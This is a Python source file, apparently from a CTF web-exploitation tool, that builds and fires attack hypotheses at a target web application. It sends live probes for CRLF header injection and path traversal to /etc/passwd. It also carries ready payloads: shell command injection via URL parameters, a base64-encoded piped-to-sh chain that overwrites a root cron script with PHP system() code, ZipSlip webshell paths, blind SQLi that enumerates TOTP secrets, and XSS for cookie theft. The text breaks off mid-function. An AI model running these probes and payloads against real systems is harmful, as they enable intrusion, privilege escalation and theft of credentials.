"""
Deep Reasoning Engine for WebCTF Suite.
A hypothesis-driven, evidence-correlating reasoning layer that enables the
tool to solve complex, multi-stage challenges that require more than
blindly firing static payloads.

Capabilities:
  1. Hypothesis Engine        - Builds offensive hypotheses from collected evidence.
  2. Evidence Correlation     - Correlates response behaviors, headers, cookies,
                                and reflection contexts to infer hidden logic.
  3. Multi-step Reasoning     - Plans multi-hop attack chains (goal decomposition).
  4. Application Logic Audit  - Detects logic flaws: CRLF/Header injection,
                                type juggling, verb tampering, race conditions,
                                cookie manipulation, path normalization, etc.
  5. Adaptive Strategy        - Learns from failed probes to pivot strategy.
"""

import re
import time
import base64
import urllib.parse
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse

from core.ui import (
    console, print_header, print_success, print_info, print_warning,
    print_error, print_table
)
from core.utils import find_flags, create_session
from modules.response_analyzer import ResponseAnalyzer


class Hypothesis:
    """A single offensive hypothesis with supporting evidence and confidence."""
    def __init__(self, title: str, vuln_class: str, confidence: float,
                 evidence: List[str], action: str, payload: str = "",
                 target_param: str = "", target_url: str = ""):
        self.title = title
        self.vuln_class = vuln_class
        self.confidence = confidence          # 0.0 - 1.0
        self.evidence = evidence              # list of observed facts
        self.action = action                  # what to do to confirm/exploit
        self.payload = payload
        self.target_param = target_param
        self.target_url = target_url

    def to_dict(self) -> Dict[str, Any]:
        return {
            "title": self.title,
            "vuln_class": self.vuln_class,
            "confidence": round(self.confidence, 2),
            "evidence": self.evidence,
            "action": self.action,
            "payload": self.payload,
            "target_param": self.target_param,
            "target_url": self.target_url,
        }


class ReasoningEngine:
    """
    Deep reasoning layer that turns raw observations into structured,
    prioritized offensive hypotheses and multi-step attack plans.
    """

    # ─── CRLF / HEADER INJECTION SIGNATURES ───────────────────────────
    CRLF_HEADER_PATTERNS = [
        (r"Set-Cookie:\s*[^;\r\n]+", "Set-Cookie header injection"),
        (r"Location:\s*[^\r\n]+", "Location/redirect header injection"),
        (r"X-Forwarded-For:\s*[^\r\n]+", "X-Forwarded-For header injection"),
        (r"Content-Type:\s*[^\r\n]+", "Content-Type header injection"),
        (r"HTTP/1\.1\s+\d{3}", "HTTP status line injection"),
    ]

    # Parameters that commonly reflect into headers (CRLF candidates)
    HEADER_REFLECT_PARAMS = [
        "lang", "locale", "redirect", "next", "url", "return", "back",
        "ref", "referer", "host", "page", "view", "theme", "color",
        "format", "callback", "jsonp", "callback_url", "target"
    ]

    # ─── LOGIC / TYPE JUGGLING SIGNATURES ─────────────────────────────
    TYPE_JUGGLING_HINTS = [
        r"==\s*['\"]?[0-9a-fA-F]{32}['\"]?",       # md5 hash comparison with ==
        r"strcmp\s*\(",                            # strcmp usage
        r"md5\s*\(",                               # md5 usage
        r"sha1\s*\(",                              # sha1 usage
        r"hash_equals",                            # secure compare (good, but check)
        r"is_numeric\s*\(",                        # is_numeric check
        r"intval\s*\(",                            # intval usage
    ]

    # ─── RACE CONDITION HINTS ─────────────────────────────────────────
    RACE_HINTS = [
        r"balance", r"transfer", r"coupon", r"discount", r"withdraw",
        r"redeem", r"claim", r"vote", r"like", r"bonus", r"credit",
        r"register", r"signup", r"invite"
    ]

    # ─── PATH NORMALIZATION / TRAVERSAL HINTS ─────────────────────────
    PATH_NORMALIZATION_HINTS = [
        r"static", r"assets", r"images", r"files", r"uploads", r"download",
        r"media", r"public", r"resources"
    ]

    # ─── CIRCUIT / LOGIC PUZZLE CHALLENGE SIGNATURES ──────────────────
    # Detects challenges that require building a logic circuit (NAND/AND/OR)
    # and submitting it to a server-side checker endpoint.
    CIRCUIT_CHALLENGE_HINTS = [
        r"nand", r"circuit", r"logic\s*gate", r"truth\s*table",
        r"flip\s*the\s*outputs", r"submitCircuit", r"simulator",
        r"intermediate\s*node", r"outputNodes", r"inputNodes"
    ]
    # Endpoints commonly used by circuit-checker challenges
    CIRCUIT_CHECK_ENDPOINTS = ["/check", "/verify", "/validate", "/submit", "/api/check"]

    # ─── ZIPSLIP / ARCHIVE TRAVERSAL SIGNATURES ───────────────────────
    # Detects challenges that accept compressed archives (tar.gz, zip) and
    # extract them server-side, potentially vulnerable to path traversal.
    ZIPSLIP_HINTS = [
        r"tar\.gz", r"\.zip", r"archive", r"upload", r"extract",
        r"unpack", r"uncompress", r"gunzip", r"tarfile", r"zipfile",
        r"virus", r"scan", r"malware", r"check_for_malicious"
    ]
    # File extensions that indicate archive uploads
    ARCHIVE_EXTENSIONS = [".tar.gz", ".tgz", ".zip", ".tar", ".gz", ".rar", ".7z"]

    # ─── COMMAND INJECTION VIA URL / MEDIA PARSING ────────────────────
    # Detects challenges where a URL/media URI is passed to a shell command
    # (curl, wget, shell_exec) allowing command injection via special chars.
    CMD_INJECTION_URL_HINTS = [
        r"media_uri", r"media", r"url", r"uri", r"fetch", r"preview",
        r"shell_exec", r"system\s*\(", r"exec\s*\(", r"passthru",
        r"curl\s+-s", r"wget", r"FILTER_VALIDATE_URL", r"escapeshellcmd"
    ]
    # Shell metacharacters that enable command injection in URL contexts
    CMD_INJECTION_CHARS = [";", "|", "&&", "||", "$(", "`", "\n"]

    # ─── SQL INJECTION VIA UNSANITIZED PARAMS ─────────────────────────
    # Detects SQL injection in parameters that are concatenated into queries
    # without proper sanitization (common in PHP/SQLite apps).
    SQLI_UNSANITIZED_HINTS = [
        r"SELECT.*FROM", r"WHERE\s+\w+\s*=", r"prepare\s*\(", r"query\s*\(",
        r"bindValue", r"bindParam", r"sqlite", r"mysqli", r"PDO",
        r"password_hash", r"reset_code", r"totp_secret"
    ]

    # ─── CRON JOB / SCHEDULED TASK OVERWRITE ──────────────────────────
    # Detects challenges where a cron job runs as root and can be overwritten
    # to achieve privilege escalation.
    CRON_OVERWRITE_HINTS = [
        r"cron", r"cronjob", r"cron\.php", r"entrypoint", r"sleep\s+\d+",
        r"while\s+true", r"root", r"chmod\s+640", r"chmod\s+644"
    ]

    # ─── TOTP / 2FA BRUTEFORCE SIGNATURES ─────────────────────────────
    # Detects challenges with TOTP/2FA that can be bypassed via secret
    # enumeration or timing attacks.
    TOTP_HINTS = [
        r"totp", r"otp", r"2fa", r"two.factor", r"verifySecret",
        r"pyotp", r"google.authenticator", r"secret_key", r"totp_secret"
    ]

    # ─── SETUID / PRIVILEGE ESCALATION SIGNATURES ─────────────────────
    # Detects challenges where a setuid binary or writable cron file
    # enables privilege escalation.
    SETUID_HINTS = [
        r"chmod\s+\+s", r"setuid", r"setgid", r"suid", r"chmod\s+4755",
        r"chmod\s+6755", r"/bin/tar", r"/bin/bash", r"/bin/sh"
    ]

    def __init__(self, target_url: str, session=None, state: Optional[Dict[str, Any]] = None):
        self.target_url = target_url.strip()
        # Strip any existing query string for clean param injection
        parsed = urlparse(self.target_url)
        self.base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        self.session = session or create_session()
        self.state = state or {}
        self.hypotheses: List[Hypothesis] = []
        self.attack_plan: List[Dict[str, Any]] = []
        self.probe_history: List[Dict[str, Any]] = []   # for adaptive strategy
        self.baseline = self.state.get("baseline_html", "")

    # ═══════════════════════════════════════════════════════════════════
    # 1. HYPOTHESIS ENGINE
    # ═══════════════════════════════════════════════════════════════════
    def build_hypotheses(self) -> List[Hypothesis]:
        """Generate a prioritized set of offensive hypotheses from current state."""
        self.hypotheses = []

        # A. CRLF / Header Injection (from reflected params + response headers)
        self._hypothesize_crlf()

        # B. Application Logic Flaws (type juggling, verb tampering, race)
        self._hypothesize_logic_flaws()

        # C. Path Normalization / Traversal
        self._hypothesize_path_normalization()

        # D. Cookie / Session Manipulation
        self._hypothesize_cookie_manipulation()

        # E. Reflection-based injection (SSTI/SQLi/XSS context detection)
        self._hypothesize_reflection_injection()

        # F. Circuit / Logic Puzzle Challenge (NAND simulator, etc.)
        self._hypothesize_circuit_challenge()

        # G. ZipSlip / Archive Traversal (tar.gz upload challenges)
        self._hypothesize_zipslip()

        # H. Command Injection via URL/Media parsing
        self._hypothesize_cmd_injection_url()

        # I. SQL Injection via unsanitized params
        self._hypothesize_sqli_unsanitized()

        # J. Cron job overwrite / Privilege Escalation
        self._hypothesize_cron_overwrite()

        # K. TOTP / 2FA bypass
        self._hypothesize_totp_bypass()

        # L. XSS-to-Admin (stored XSS + admin bot / report endpoint)
        self._hypothesize_xss_to_admin()

        # Sort by confidence descending
        self.hypotheses.sort(key=lambda h: h.confidence, reverse=True)
        return self.hypotheses

    def _hypothesize_crlf(self):
        """Detect parameters that reflect into response headers -> CRLF injection."""
        params = list(self.state.get("parameters", []))
        if not params:
            params = self.HEADER_REFLECT_PARAMS

        # Only test params that look header-related
        candidates = [p for p in params if p.lower() in self.HEADER_REFLECT_PARAMS]
        if not candidates:
            candidates = params[:3]

        for param in candidates:
            # Probe: inject a canary into a header via CRLF
            canary = "ctf_hdr_%d" % int(time.time() % 100000)
            probe = f"fr%0d%0aX-Ctf-Canary: {canary}"
            try:
                # Build URL manually to preserve CRLF encoding exactly
                sep = "&" if "?" in self.base_url else "?"
                probe_url = f"{self.base_url}{sep}{param}={probe}"
                r = self.session.get(probe_url, allow_redirects=False, timeout=5)
                resp_headers = {k.lower(): v for k, v in r.headers.items()}
                # Check if our injected header appears in response headers
                injected = False
                for hname, hval in resp_headers.items():
                    if canary in hval or "x-ctf-canary" in hname:
                        injected = True
                        break
                # Also check body reflection of the canary
                body_reflect = canary in r.text

                if injected or body_reflect:
                    self.hypotheses.append(Hypothesis(
                        title="CRLF / HTTP Header Injection",
                        vuln_class="crlf_injection",
                        confidence=0.9 if injected else 0.6,
                        evidence=[
                            f"Parameter '{param}' reflects input into HTTP response",
                            f"Injected header 'X-Ctf-Canary' observed in response" if injected else f"Canary reflected in body (potential header context)",
                            f"Probe: {probe}"
                        ],
                        action="Inject Set-Cookie / Location headers to escalate privileges or redirect",
                        payload=f"{param}=fr%0d%0aSet-Cookie:%20admin=1%3b%20Path%3d/",
                        target_param=param,
                        target_url=self.base_url
                    ))
            except Exception:
                pass

    def _hypothesize_logic_flaws(self):
        """Detect type juggling, verb tampering, and race condition surfaces."""
        html = self.state.get("baseline_html", "")
        forms = self.state.get("forms", [])
        endpoints = list(self.state.get("endpoints", []))

        # Type juggling: look for hash comparisons in leaked source
        leaked = " ".join(self.state.get("leaked_source_files", {}).values())
        if leaked:
            for pat in self.TYPE_JUGGLING_HINTS:
                if re.search(pat, leaked, re.IGNORECASE):
                    self.hypotheses.append(Hypothesis(
                        title="PHP Type Juggling / Magic Hash Bypass",
                        vuln_class="type_juggling",
                        confidence=0.85,
                        evidence=[f"Source code contains pattern: {pat}"],
                        action="Submit magic hash values (0e...) or array injection to bypass comparison",
                        payload="password[]=x&username=admin",
                        target_param="password"
                    ))
                    break

        # Verb tampering: check if endpoints respond differently to methods
        for ep in endpoints[:5]:
            try:
                r_get = self.session.get(ep, timeout=4)
                r_post = self.session.post(ep, data={}, timeout=4)
                if r_get.status_code != r_post.status_code and r_post.status_code in [200, 405]:
                    self.hypotheses.append(Hypothesis(
                        title="HTTP Verb Tampering",
                        vuln_class="verb_tampering",
                        confidence=0.7,
                        evidence=[
                            f"GET {ep} -> {r_get.status_code}",
                            f"POST {ep} -> {r_post.status_code} (different behavior)"
                        ],
                        action="Try alternate HTTP methods (PUT, PATCH, OPTIONS, TRACE) to access protected functionality",
                        target_url=ep
                    ))
                    break
            except Exception:
                pass

        # Race condition: look for sensitive action endpoints
        for ep in endpoints:
            if any(kw in ep.lower() for kw in self.RACE_HINTS):
                self.hypotheses.append(Hypothesis(
                    title="Race Condition / TOCTOU",
                    vuln_class="race_condition",
                    confidence=0.6,
                    evidence=[f"Endpoint '{ep}' suggests a state-changing action (balance/transfer/claim)"],
                    action="Send concurrent requests to exploit TOCTOU (double-spend, double-claim)",
                    target_url=ep
                ))
                break

    def _hypothesize_path_normalization(self):
        """Detect path normalization / traversal via static file serving."""
        endpoints = list(self.state.get("endpoints", []))
        for ep in endpoints:
            if any(kw in ep.lower() for kw in self.PATH_NORMALIZATION_HINTS):
                # Probe traversal through the static path
                probe_url = urljoin(ep, "../../../../etc/passwd")
                try:
                    r = self.session.get(probe_url, timeout=4)
                    if "root:x:0:0:" in r.text:
                        self.hypotheses.append(Hypothesis(
                            title="Path Normalization / Traversal via Static Serving",
                            vuln_class="path_traversal",
                            confidence=0.95,
                            evidence=[f"Traversal through '{ep}' leaked /etc/passwd"],
                            action="Extract source code and secrets via path traversal",
                            payload="../../../../etc/passwd",
                            target_url=probe_url
                        ))
                        break
                except Exception:
                    pass

    def _hypothesize_cookie_manipulation(self):
        """Detect cookie-based auth that can be forged or manipulated."""
        cookies = self.state.get("cookies", {})
        for cname, cval in cookies.items():
            cl = cname.lower()
            # Boolean / role cookies
            if any(k in cl for k in ["admin", "role", "user", "auth", "logged", "is_", "privilege"]):
                self.hypotheses.append(Hypothesis(
                    title="Cookie-Based Authorization Manipulation",
                    vuln_class="cookie_manipulation",
                    confidence=0.75,
                    evidence=[f"Cookie '{cname}' suggests client-side authorization"],
                    action="Flip cookie value (admin=0->1, role=user->admin) and re-request protected pages",
                    payload=f"{cname}=admin",
                    target_param=cname
                ))
            # Serialized cookies (PHP session, pickle)
            if cval.startswith(("O:", "a:", "s:", "i:")) or "|" in cval:
                self.hypotheses.append(Hypothesis(
                    title="Serialized Cookie / Session Injection",
                    vuln_class="deserialization",
                    confidence=0.8,
                    evidence=[f"Cookie '{cname}' contains serialized data"],
                    action="Craft malicious serialized object to achieve RCE or auth bypass",
                    target_param=cname
                ))

    def _hypothesize_reflection_injection(self):
        """Detect reflection contexts to infer SSTI/SQLi/XSS injection points."""
        params = list(self.state.get("parameters", []))
        canary = "ctf_reflect_%d" % int(time.time() % 100000)
        for param in params[:6]:
            try:
                r = self.session.get(self.target_url, params={param: canary}, timeout=4)
                if canary in r.text:
                    # Determine reflection context
                    idx = r.text.find(canary)
                    before = r.text[max(0, idx-60):idx]
                    after = r.text[idx+len(canary):idx+len(canary)+60]

                    context = "unknown"
                    if re.search(r"<script[^>]*>", before) or re.search(r"</script>", after):
                        context = "javascript"
                    elif re.search(r"<[a-z]+[^>]*>", before) and re.search(r"</[a-z]+>", after):
                        context = "html_attribute"
                    elif re.search(r"['\"]", before) and re.search(r"['\"]", after):
                        context = "quoted_attribute"
                    elif re.search(r"\{\{|\{%", before):
                        context = "template"
                    elif re.search(r"SELECT|WHERE|FROM", before, re.IGNORECASE):
                        context = "sql"

                    if context in ["javascript", "html_attribute", "quoted_attribute"]:
                        self.hypotheses.append(Hypothesis(
                            title=f"Reflected Input in {context} Context",
                            vuln_class="xss" if context == "javascript" else "html_injection",
                            confidence=0.8,
                            evidence=[f"Parameter '{param}' reflects in {context} context"],
                            action=f"Craft {context}-specific payload to break out and inject",
                            target_param=param
                        ))
                    elif context == "template":
                        self.hypotheses.append(Hypothesis(
                            title="SSTI Reflection Context Detected",
                            vuln_class="ssti",
                            confidence=0.85,
                            evidence=[f"Parameter '{param}' reflects inside template delimiters"],
                            action="Inject Jinja2/Twig RCE payload",
                            target_param=param
                        ))
            except Exception:
                pass

    def _hypothesize_circuit_challenge(self):
        """
        Detect logic-puzzle challenges (NAND simulator, circuit builder, etc.)
        where the flag is revealed by submitting a correct circuit to a
        server-side checker endpoint. These challenges often have a weak
        server-side validator that can be brute-forced by fuzzing node IDs.
        """
        html = self.state.get("baseline_html", "")
        endpoints = list(self.state.get("endpoints", []))
        inline_scripts = self.state.get("inline_scripts", [])

        # Combine all source text for signature scanning
        all_source = html + " " + " ".join(inline_scripts)
        all_source_lower = all_source.lower()

        # Detect circuit/logic-puzzle challenge signatures
        is_circuit = any(re.search(pat, all_source_lower) for pat in self.CIRCUIT_CHALLENGE_HINTS)

        # Detect a checker endpoint (POST /check with JSON circuit body)
        check_endpoint = None
        for ep in endpoints:
            if any(ep.lower().endswith(c) for c in self.CIRCUIT_CHECK_ENDPOINTS):
                check_endpoint = ep
                break
        # Also detect via inline JS fetch('/check')
        if not check_endpoint:
            m = re.search(r"fetch\(\s*['\"]([^'\"]*check[^'\"]*)['\"]", all_source)
            if m:
                check_endpoint = m.group(1)

        if is_circuit and check_endpoint:
            # Detect the circuit JSON structure from inline JS
            has_input1 = "input1" in all_source
            has_output = "output" in all_source
            has_node_id = "nodeId" in all_source or "node_id" in all_source

            # Detect number of outputs
            output_count = 4  # default
            m = re.search(r"for\s*\(\s*let\s+i\s*=\s*0\s*;\s*i\s*<\s*(\d+)\s*;\s*i\+\+\s*\)\s*\{\s*createNode", all_source)
            if m:
                output_count = int(m.group(1))

            # Detect input node IDs (from resetGame: nextNodeId = N)
            input_start = 5  # default: inputs start at 5
            m = re.search(r"nextNodeId\s*=\s*(\d+)", all_source)
            if m:
                input_start = int(m.group(1))

            evidence = [
                f"Page contains circuit/logic-puzzle signatures (NAND simulator)",
                f"Checker endpoint found: {check_endpoint}",
                f"Circuit JSON uses input1/input2/output fields" if has_input1 and has_output else "Circuit JSON structure detected",
                f"Detected {output_count} output nodes, inputs starting at node {input_start}"
            ]

            self.hypotheses.append(Hypothesis(
                title="Circuit Logic Challenge - Node ID Brute-Force",
                vuln_class="circuit_bruteforce",
                confidence=0.85,
                evidence=evidence,
                action=(
                    f"POST to {check_endpoint} with JSON {{'circuit': [...]}} "
                    f"fuzzing node IDs (inputs {input_start}-{input_start+output_count}, "
                    f"outputs 1-{output_count}) to find the correct circuit that "
                    f"reveals the flag"
                ),
                payload=f'{{"circuit":[{{"input1":{input_start},"input2":{input_start},"output":1}}]}}',
                target_url=check_endpoint
            ))

            # Also hypothesize that the checker may accept a trivial/empty circuit
            # if the server-side validation is weak (e.g., only checks output count)
            self.hypotheses.append(Hypothesis(
                title="Circuit Checker - Weak Server-Side Validation",
                vuln_class="circuit_weak_validation",
                confidence=0.5,
                evidence=[
                    f"Checker endpoint {check_endpoint} may not validate circuit correctness strictly",
                    "Try submitting minimal/empty circuits to probe validation logic"
                ],
                action=f"POST empty or minimal circuits to {check_endpoint} and observe response differences",
                payload='{"circuit":[]}',
                target_url=check_endpoint
            ))

    def _hypothesize_zipslip(self):
        """
        Detect ZipSlip / archive traversal challenges where a compressed
        archive (tar.gz, zip) is uploaded and extracted server-side with
        a vulnerable library (tarfile, zipfile). The attacker can craft
        an archive with path traversal filenames to write files anywhere
        on the filesystem (e.g., a PHP webshell in the web root).
        """
        html = self.state.get("baseline_html", "")
        forms = self.state.get("forms", [])
        leaked = " ".join(self.state.get("leaked_source_files", {}).values())
        all_source = html + " " + leaked

        # Detect file upload forms
        has_upload = any(
            f.get("enctype") == "multipart/form-data" or
            any(i.get("type") == "file" for i in f.get("inputs", []))
            for f in forms
        )

        # Detect archive-related keywords in source
        has_archive = any(re.search(pat, all_source, re.IGNORECASE) for pat in self.ZIPSLIP_HINTS)

        # Detect tarfile/zipfile usage in leaked source (vulnerable library)
        has_tarfile = bool(re.search(
            r"tarfile\.open|tar\.extractall|zipfile\.ZipFile|\.extractall\(|PharData|extractTo\(",
            all_source
        ))

        if has_upload and (has_archive or has_tarfile):
            evidence = [
                "File upload form detected (multipart/form-data)",
                "Archive-related keywords found (tar.gz, extract, scan)" if has_archive else "tarfile/zipfile extraction detected in source",
                "Potential ZipSlip: archive extraction may not sanitize filenames"
            ]
            self.hypotheses.append(Hypothesis(
                title="ZipSlip / Archive Path Traversal",
                vuln_class="zipslip",
                confidence=0.9 if has_tarfile else 0.7,
                evidence=evidence,
                action=(
                    "Craft a malicious tar.gz/zip archive with path traversal "
                    "filenames (../../../../var/www/html/shell.php) to write a "
                    "webshell or overwrite files. Use evilarc or manual tar "
                    "creation with crafted member names."
                ),
                payload="../../../../var/www/html/shell.php",
                target_param="file"
            ))

            # If setuid binary detected, add PE hypothesis
            if re.search(r"chmod\s+\+s|setuid|suid", all_source, re.IGNORECASE):
                self.hypotheses.append(Hypothesis(
                    title="Setuid Binary Privilege Escalation",
                    vuln_class="setuid_pe",
                    confidence=0.8,
                    evidence=[
                        "Setuid binary detected in source (chmod +s)",
                        "Can use setuid binary to read root-only files (e.g., /root/flag.txt)"
                    ],
                    action="Use setuid binary (e.g., tar) to read root-only files: tar --create tar.tar /root",
                    payload="tar --create tar.tar /root",
                    target_url=self.base_url
                ))

    def _hypothesize_cmd_injection_url(self):
        """
        Detect command injection via URL/media URI parsing. Challenges where
        a user-supplied URL is passed to a shell command (curl, shell_exec)
        allowing injection via shell metacharacters (;, |, $(), etc.).
        """
        html = self.state.get("baseline_html", "")
        forms = self.state.get("forms", [])
        leaked = " ".join(self.state.get("leaked_source_files", {}).values())
        all_source = html + " " + leaked

        # Detect media/URL input fields
        has_media_field = any(
            any(i.get("name") in ["media_uri", "url", "uri", "media", "link"] for i in f.get("inputs", []))
            for f in forms
        )

        # Detect shell execution of user input in source
        has_shell_exec = bool(re.search(r"shell_exec\s*\(|system\s*\(|exec\s*\(|passthru\s*\(", all_source))
        has_curl = bool(re.search(r"curl\s+-s|wget", all_source))
        has_filter_url = bool(re.search(r"FILTER_VALIDATE_URL", all_source))

        if has_media_field and (has_shell_exec or has_curl or has_filter_url):
            evidence = [
                "Media/URL input field detected",
                "User-supplied URL passed to shell command" if has_shell_exec else "URL processed by curl/wget",
                "FILTER_VALIDATE_URL allows special chars (;, |) in URL path"
            ]
            self.hypotheses.append(Hypothesis(
                title="Command Injection via URL/Media Parsing",
                vuln_class="cmd_injection_url",
                confidence=0.85,
                evidence=evidence,
                action=(
                    "Inject shell commands via URL: http://google.com/aaa?x=;cat${IFS}/flag.txt "
                    "(use ${IFS} instead of spaces since FILTER_VALIDATE_URL blocks spaces)"
                ),
                payload="http://google.com/aaa?x=;cat${IFS}/flag.txt",
                target_param="media_uri"
            ))

            # If cron job detected, add cron overwrite hypothesis
            if re.search(r"cron|entrypoint|while\s+true", all_source, re.IGNORECASE):
                self.hypotheses.append(Hypothesis(
                    title="Cron Job Overwrite for Privilege Escalation",
                    vuln_class="cron_overwrite",
                    confidence=0.75,
                    evidence=[
                        "Cron job detected running as root",
                        "Can overwrite cron.php (writable by www-data) to execute commands as root"
                    ],
                    action=(
                        "Overwrite cron.php via command injection to copy flag: "
                        "echo '<?php system(\"cat /flag.txt > /var/www/html/assets/flag.txt\"); ?>' > /var/www/cron.php"
                    ),
                    payload="http://google.com/aaa?x=;echo${IFS}'ZWNobyAiPD9waHAgZWNobyBzeXN0ZW0oJ2NhdCAvZmxhZy50eHQgPiAvdmFyL3d3dy9odG1sL2Fzc2V0cy9mbGFnLnR4dCcpOyA/PiIgPiAvdmFyL3d3dy9jcm9uLnBocA=='${IFS}|${IFS}base64${IFS}-d${IFS}|sh;",
                    target_param="media_uri"
                ))

    def _hypothesize_sqli_unsanitized(self):
        """
        Detect SQL injection via unsanitized parameters. Common in PHP/SQLite
        apps where user input is concatenated into SQL queries without
        parameterization, or where the app uses string interpolation.
        """
        html = self.state.get("baseline_html", "")
        forms = self.state.get("forms", [])
        leaked = " ".join(self.state.get("leaked_source_files", {}).values())
        all_source = html + " " + leaked

        # Detect SQL-related keywords
        has_sql = any(re.search(pat, all_source, re.IGNORECASE) for pat in self.SQLI_UNSANITIZED_HINTS)

        # Detect unsanitized string interpolation in SQL (e.g., WHERE username = '$username')
        has_unsanitized = bool(re.search(
            r"WHERE\s+\w+\s*=\s*['\"]\s*\$|SELECT.*\$_(GET|POST|REQUEST)|query\s*\(\s*['\"].*\$",
            all_source, re.IGNORECASE
        ))

        # Detect login/reset forms
        has_auth_form = any(
            any(i.get("name") in ["username", "password", "code", "reset_code"] for i in f.get("inputs", []))
            for f in forms
        )

        if has_sql and (has_unsanitized or has_auth_form):
            evidence = [
                "SQL-related keywords detected in source",
                "Unsanitized string interpolation in SQL query" if has_unsanitized else "Authentication form detected (potential SQLi surface)",
                "User input may be concatenated into SQL without parameterization"
            ]
            self.hypotheses.append(Hypothesis(
                title="SQL Injection via Unsanitized Parameter",
                vuln_class="sqli_unsanitized",
                confidence=0.85 if has_unsanitized else 0.6,
                evidence=evidence,
                action=(
                    "Inject SQL via unsanitized params. For boolean-based blind SQLi: "
                    "' or totp_secret like 'A%'; --  (enumerate secret char by char)"
                ),
                payload="' or totp_secret like 'A%'; --",
                target_param="username"
            ))

    def _hypothesize_cron_overwrite(self):
        """
        Detect cron job overwrite / privilege escalation challenges where a
        cron script runs as root and can be overwritten by the web user.
        """
        html = self.state.get("baseline_html", "")
        leaked = " ".join(self.state.get("leaked_source_files", {}).values())
        all_source = html + " " + leaked

        has_cron = any(re.search(pat, all_source, re.IGNORECASE) for pat in self.CRON_OVERWRITE_HINTS)
        has_writable = bool(re.search(r"chmod\s+6\d\d|chmod\s+7\d\d|www-data|/var/www", all_source, re.IGNORECASE))

        if has_cron and has_writable:
            self.hypotheses.append(Hypothesis(
                title="Cron Job Overwrite - Privilege Escalation",
                vuln_class="cron_overwrite",
                confidence=0.7,
                evidence=[
                    "Cron job detected running periodically",
                    "Web root writable by www-data (can overwrite cron script)",
                    "Cron runs as root -> arbitrary command execution as root"
                ],
                action=(
                    "Overwrite cron script with PHP webshell to copy flag to web root: "
                    "echo '<?php system(\"cat /flag.txt > /var/www/html/assets/flag.txt\"); ?>' > /var/www/cron.php"
                ),
                payload="echo '<?php system(\"cat /flag.txt > /var/www/html/assets/flag.txt\"); ?>' > /var/www/cron.php"
            ))

    def _hypothesize_totp_bypass(self):
        """
        Detect TOTP/2FA bypass opportunities. Challenges with TOTP secrets
        that can be enumerated via SQLi or timing attacks, or where the
        secret is short enough to brute-force.
        """
        html = self.state.get("baseline_html", "")
        forms = self.state.get("forms", [])
        leaked = " ".join(self.state.get("leaked_source_files", {}).values())
        all_source = html + " " + leaked

        has_totp = any(re.search(pat, all_source, re.IGNORECASE) for pat in self.TOTP_HINTS)
        has_totp_form = any(
            any(i.get("name") in ["totp", "otp", "code"] for i in f.get("inputs", []))
            for f in forms
        )

        if has_totp and (has_totp_form or "totp" in all_source.lower()):
            self.hypotheses.append(Hypothesis(
                title="TOTP/2FA Bypass via Secret Enumeration",
                vuln_class="totp_bypass",
                confidence=0.7,
                evidence=[
                    "TOTP/2FA authentication detected",
                    "TOTP secret may be enumerable via SQLi or short enough to brute-force",
                    "Generate OTP with pyotp: pyotp.TOTP(secret).now()"
                ],
                action=(
                    "Enumerate TOTP secret via SQLi boolean-based blind: "
                    "' or totp_secret like 'A%'; --  (char by char), then generate OTP with pyotp"
                ),
                payload="' or totp_secret like 'A%'; --",
                target_param="username"
            ))

    def _hypothesize_xss_to_admin(self):
        """
        Detect XSS-to-Admin challenges: a forum/message-board with a stored-XSS
        sink (comment/message/post form) plus an admin-bot / report endpoint.
        The goal is to steal the admin cookie or trigger a flag reveal.
        """
        html = self.state.get("baseline_html", "")
        forms = self.state.get("forms", [])
        endpoints = list(self.state.get("endpoints", []))

        # 1. Detect admin-bot / report endpoints
        report_endpoints = [ep for ep in endpoints if any(
            k in ep.lower() for k in ["report", "contact", "admin", "bot", "visit", "submit", "send"]
        )]
        for m in re.findall(r'(?:href|action)\s*=\s*["\']([^"\']*(?:report|contact|admin|bot|visit)[^"\']*)["\']', html, re.IGNORECASE):
            report_endpoints.append(m)
        has_admin_bot = bool(report_endpoints)

        # 2. Detect stored-XSS sink forms (message/comment/post)
        sink_forms = [f for f in forms if any(
            any(k in i.get("name", "").lower() for k in ["message", "comment", "post", "content", "text", "msg", "body", "title", "subject"])
            for i in f.get("inputs", [])
        )]
        if not sink_forms:
            sink_forms = [f for f in forms if any(i.get("type") in ("textarea", "text") for i in f.get("inputs", []))]

        # 3. Forum / guestbook indicators
        is_forum = any(k in html.lower() for k in ["forum", "message", "comment", "guestbook", "post", "thread", "board"])

        if sink_forms and (is_forum or has_admin_bot):
            self.hypotheses.append(Hypothesis(
                title="Stored XSS to Admin (Cookie Theft / Flag Reveal)",
                vuln_class="xss_to_admin",
                confidence=0.85 if has_admin_bot else 0.6,
                evidence=[
                    f"Stored-XSS sink form detected: {sink_forms[0].get('action', '?')}",
                    "Admin bot / report endpoint detected" if has_admin_bot else "Forum/message-board detected",
                    "Goal: submit filter-evading XSS payload, then trigger admin bot to steal cookie"
                ],
                action=(
                    "Submit OWASP filter-evasion XSS payload (entity-encoded, event-handler, "
                    "mXSS polyglot) into the message/comment field, then trigger the admin bot "
                    "via the report endpoint to exfiltrate the admin cookie or reveal the flag"
                ),
                payload="<img src=x onerror=alert(document.cookie)>",
                target_param="message"
            ))

    # ═══════════════════════════════════════════════════════════════════
    # 2. EVIDENCE CORRELATION
    # ═══════════════════════════════════════════════════════════════════
    def correlate_evidence(self) -> List[Dict[str, Any]]:
        """
        Correlate multiple weak signals into a strong conclusion.
        E.g. leaked source + reflected param + specific header = confirmed vector.
        """
        correlations = []
        leaked = self.state.get("leaked_source_files", {})
        params = list(self.state.get("parameters", []))
        tech = [t.lower() for t in self.state.get("tech_stack", [])]

        # 1. Leaked source reveals a sink + matching param exists
        for fname, code in leaked.items():
            # Find dangerous sinks and their parameter names
            sinks = re.findall(
                r"(?:request\.(?:args|form|cookies|values)\[['\"]([^'\"]+)['\"]\]|"
                r"\$_GET\['([^']+)'\]|\$_POST\['([^']+)'\]|\$_REQUEST\['([^']+)'\]|"
                r"request\.get\('([^']+)'\))",
                code
            )
            sink_params = set()
            for s in sinks:
                for g in s:
                    if g:
                        sink_params.add(g)

            # Check for dangerous function calls
            dangerous = []
            if re.search(r"pickle\.loads|yaml\.load|unserialize\(|eval\(|exec\(|system\(|os\.system|subprocess|shell=True", code):
                dangerous.append("code_execution")
            if re.search(r"render_template_string|Template\(|jinja2|twig", code):
                dangerous.append("ssti")
            if re.search(r"SELECT.*FROM|execute\(.*SELECT|\.query\(", code, re.IGNORECASE):
                dangerous.append("sqli")
            if re.search(r"open\(|file_get_contents|include\(|require\(|readfile", code):
